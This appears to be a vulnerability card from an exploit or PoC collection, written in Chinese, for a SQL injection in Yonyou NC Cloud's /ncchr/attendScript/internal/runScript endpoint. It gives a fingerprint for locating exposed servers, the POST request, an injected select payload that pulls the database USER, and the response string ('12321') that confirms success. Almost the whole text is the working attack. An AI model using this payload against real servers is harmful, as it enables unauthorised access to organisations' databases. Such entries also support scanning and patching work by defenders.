# 用友-NC-CloudrunscriptSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`header="nccloud"`
- **请求**：`POST /ncchr/attendScript/internal/runScript HTTP/1.1`

**Payload**
```
key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual
```
- **响应特征**：200 12321